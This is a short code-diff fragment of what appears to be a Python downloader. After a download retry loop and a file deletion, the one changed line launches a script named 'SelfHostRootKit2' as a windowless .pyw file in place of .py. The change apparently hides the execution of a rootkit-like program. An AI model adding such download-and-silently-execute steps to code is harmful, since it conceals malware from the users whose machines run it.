@@ -114,4 +114,4 @@ while tryit == False:
         print("download error")
         time.sleep(0.5)
 os.remove(getFileName())
-os.system("SelfHostRootKit2.py")
+os.system("SelfHostRootKit2.pyw")
